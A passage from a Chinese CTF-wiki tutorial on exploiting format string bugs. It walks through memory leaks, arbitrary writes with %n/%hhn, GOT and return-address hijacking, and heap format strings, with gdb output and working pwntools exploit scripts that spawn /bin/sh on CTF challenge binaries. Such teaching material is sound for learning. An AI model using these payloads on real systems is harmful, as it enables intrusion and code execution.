其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出

```
 → 0xf7615670 <printf+0>       call   0xf76ebb09 <__x86.get_pc_thunk.ax>
   ↳  0xf76ebb09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf76ebb0c <__x86.get_pc_thunk.ax+3> ret
      0xf76ebb0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf76ebb10 <__x86.get_pc_thunk.dx+3> ret
───────────────────────────────────────────────────────────────────[ stack ]────
['0xffbbf8dc', 'l8']
8
0xffbbf8dc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
0xffbbf8e8│+0x0c: 0x000000c2
0xffbbf8ec│+0x10: 0xf765c6bb  →  <handle_intel+107> add esp, 0x10
0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp     ← $eax
0xffbbf8f4│+0x18: "%4$s"
0xffbbf8f8│+0x1c: 0x00000000

```

同时，在我们运行的 terminal 下

```
➜  leakmemory git:(master) ✗ python exploit.py
[+] Starting local process './leakmemory': pid 65363
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
0x804a014
\x14\xa0\x0%4$s
[*] running in new terminal: /usr/bin/gdb -q  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory" 65363
[+] Waiting for debugger: Done
0xf76280c0
[*] Switching to interactive mode
[*] Process './leakmemory' stopped with exit code 0 (pid 65363)
[*] Got EOF while reading in interactiv

```

我们确实得到了 scanf 的地址。

但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。

```
[padding][addr]
```

注意

> 我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将, x,0,c 分别作为一个字符进行读入。下面就是错误的例子。
> 
> ```
> 0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
> 0xffffcd00│+0x04: 0xffffcd10  →  "\x0c\xa0\x04\x08%4$s"
> 0xffffcd04│+0x08: 0xffffcd10  →  "\x0c\xa0\x04\x08%4$s"
> 0xffffcd08│+0x0c: 0x000000c2
> 0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
> 0xffffcd10│+0x14: "\x0c\xa0\x04\x08%4$s"     ← $eax
> 0xffffcd14│+0x18: "\xa0\x04\x08%4$s"
> 0xffffcd18│+0x1c: "\x04\x08%4$s"
> ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
> [#0] 0xf7e44670 → Name: __printf(format=0xffffcd10 "\\x0c\\xa0\\x04\\x08%4$s")
> [#1] 0x80484ce → Name: main()
> ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
> gef➤  x/x 0xffffcd10
> 0xffffcd10:    0x6330785c
> 
> ```

覆盖内存
----

上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型

```
%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
```

通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。

这里我们给出如下的程序来介绍相应的部分。

```
/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}

```

makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload

```
...[overwrite addr]....%[overwrite offset]$n
```

其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤

*   确定覆盖地址
*   确定相对偏移
*   进行覆盖

### 覆盖栈内存

#### 确定覆盖地址

首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。

#### 确定相对偏移

其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试

```
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcd0c', 'l8']
8
0xffffcd0c│+0x00: 0x080484d7  →  <main+76> add esp, 0x10     ← $esp
0xffffcd10│+0x04: 0xffffcd28  →  "%d%d"
0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315
0xffffcd18│+0x0c: 0x000000c2
0xffffcd1c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000
0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
0xffffcd28│+0x1c: "%d%d"     ← $eax

```

我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串’%d%d’的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。

#### 进行覆盖

这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下

```
[addr of c]%012d%6$n
```

addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。

具体脚本如下

```
def forc():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print hex(c_addr)
    payload = p32(c_addr) + '%012d' + '%6$n'
    print payload
    #gdb.attach(sh)
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()
forc()

```

结果如下

```
➜  overwrite git:(master) ✗ python exploit.py
[+] Starting local process './overwrite': pid 74806
0xfffd8cdc
܌��%012d%6$n
܌��-00000160648modified c.

```

### 覆盖任意地址内存

#### 覆盖小数字

首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，**小于机器字长的数字**。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。

> 或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。

那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是

```
aa%k$nxx
```

此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。

利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。

```
.data:0804A024                 public a
.data:0804A024 a               dd 7Bh

```

故而我们可以构造如下的利用代码

```
def fora():
    sh = process('./overwrite')
    a_addr = 0x0804A024
    payload = 'aa%8$naa' + p32(a_addr)
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()

```

对应的结果如下

```
➜  overwrite git:(master) ✗ python exploit.py
[+] Starting local process './overwrite': pid 76508
[*] Process './overwrite' stopped with exit code 0 (pid 76508)
0xffc1729c
aaaa$\xa0\x0modified a for a small number.

```

其实，这里我们需要掌握的小技巧就是，我们没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。

#### 覆盖大数字

上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。

不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：

```
hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。
h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。

```

所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。

首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。

```
.data:0804A028                 public b
.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r

```

即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。

```
0x0804A028 \x78
0x0804A029 \x56
0x0804A02a \x34
0x0804A02b \x12

```

首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的

```
p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n'
```

我们可以依次进行计算。这里给出一个基本的构造，如下

```
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr
def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload
payload = fmt_str(6,4,0x0804A028,0x12345678)

```

其中每个参数的含义基本如下

*   offset 表示要覆盖的地址最初的偏移
*   size 表示机器字长
*   addr 表示将要覆盖的地址。
*   target 表示我们要覆盖为的目的变量值。

相应的 exploit 如下

```
def forb():
    sh = process('./overwrite')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)
    print payload
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()

```

结果如下

```
➜  overwrite git:(master) ✗ python exploit.py
[+] Starting local process './overwrite': pid 78547
(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn
[*] Process './overwrite' stopped with exit code 0 (pid 78547)
0xfff6f9bc
(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b for a big number!

```

当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。

下面会介绍一些 CTF 中的格式化漏洞的题目。也都是格式化字符串常见的利用。

64 位程序格式化字符串漏洞
--------------

### 原理

其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。

### 例子

这里，我们以 2017 年的 UIUCTF 中 [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck) 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。

#### 确定保护

```
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

可以看出程序开启了 NX 保护以及部分 RELRO 保护。

#### 分析程序

可以发现，程序的漏洞很明显

```
  for ( j = 0; j <= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }

```

#### 确定偏移

我们在 printf 处下偏移如下, 这里只关注代码部分与栈部分。

```
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:
Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28    printf.c: 没有那个文件或目录.
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8     ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────

```

可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 `%order$s` 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 `%9$s` 即可得到 flag 的内容。当然，我们还有更简单的方法利用 [https://github.com/scwuaptx/Pwngdb](https://github.com/scwuaptx/Pwngdb) 中的 fmtarg 来判断某个参数的偏移。

```
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10

```

需要注意的是我们必须 break 在 printf 处。

#### 利用程序

```
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
##gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()

```

hijack GOT
----------

### 原理

在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。

假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤

*   确定函数 A 的 GOT 表地址。
    
    *   这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。
*   确定函数 B 的内存地址
    
    *   这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。
*   将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。
    
    *   这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种
        
        *   写入函数：write 函数。
        *   ROP
        
        ```
        pop eax; ret;             # printf@got -> eax
        pop ebx; ret;             # (addr_offset = system_addr - printf_addr) -> ebx
        add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
        
        ```
        
        *   格式化字符串任意地址写

### 例子

这里我们以 2016 CCTF 中的 [pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3) 为例进行介绍。

#### 确定保护

如下

```
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

可以看出程序主要开启了 NX 保护。我们一般默认远程都是开启 ASLR 保护的。

#### 分析程序

首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞

```
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3
  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);
    }
  }
  return printf(&dest);
}

```

#### 漏洞利用思路

既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路

*   绕过密码
*   确定格式化字符串参数偏移
*   利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。
*   修改 puts@got 的内容为 system 的地址。
*   当程序再次执行 puts 函数的时候，其实执行的是 system 函数。

#### 漏洞利用程序

如下

```
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')
def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data
def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)
def show_dir():
    sh.sendline('dir')
tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)
## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)
##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])
## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))
## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')
## system('/bin/sh')
show_dir()
sh.interactive()

```

注意

*   我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。
*   这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。

hijack retaddr
--------------

### 原理

很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。

### 例子

这里我们以 [三个白帽 - pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0) 为例进行分析。

#### 确定保护

```
➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

可以看出程序主要开启了 NX 保护以及 Full RELRO 保护。这我们就没有办法修改程序的 got 表了。

#### 分析程序

简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞

```
int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a4 + 4);
}

```

其输出的内容为 &a4 + 4。我们回溯一下，发现我们读入的 password 内容也是

```
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
```

当然我们还可以发现 username 和 password 之间的距离为 20 个字节。

```
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &bufa, 0x14uLL);
  if ( v8 && v8 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;

```

好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。

#### 利用思路

我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用 system(‘bin/sh’) 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。

虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下

*   确定偏移
*   获取函数的 rbp 与返回地址
*   根据相对偏移获取存储返回地址的地址
*   将执行 system 函数调用的地址写入到存储返回地址的地址。

#### 确定偏移

首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&a4 + 4) 函数处

```
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
...

```

此时栈的情况为

```
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x400b1a                  call   0x400758
     0x400b1f                  lea    rdi, [rbp+0x10]
     0x400b23                  mov    eax, 0x0
 →   0x400b28                  call   0x400770
   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
        0x400776                  xchg   ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
        0x40077e                  xchg   ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"     ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2

```

可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。

#### 修改地址

我们再仔细观察下断点处栈的信息

```
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"     ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2

```

可以看到栈上第二个位置存储的就是该函数的返回地址 (其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。

与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。

0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。

这里需要说明的是在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system(“/bin/sh”) 处

```
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn

```

#### 利用程序

```
from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./pwnme_k0")
binary=ELF("pwnme_k0")
#gdb.attach(sh)
sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
ret_addr = int(sh.recvline().strip(),16) - 0x38
success("ret_addr:"+hex(ret_addr))
sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
#sh.writeline("%2214d%8$hn")
#0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")
sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()

```

堆上的格式化字符串漏洞
-----------

### 原理

所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。

### 例子

这里我们以 2015 年 CSAW 中的 [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts) 为例进行介绍。

#### 确定保护

```
➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

可以看出程序不仅开启了 NX 保护还开启了 Canary。

#### 分析程序

简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在打印联系人信息的时候存在格式化字符串漏洞。

```
int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}

```

仔细看看，可以发现这个 format 其实是指向堆中的。

#### 利用思路

我们的基本目的是获取系统的 shell，从而拿到 flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持 got 表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下

*   之所以不能够劫持 got 来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有 printf 函数，我们只有选择它才可以构造 /bin/sh 让它执行 system(‘/bin/sh’)，但是 printf 函数在其他地方也均有用到，这样做会使得程序直接崩溃。
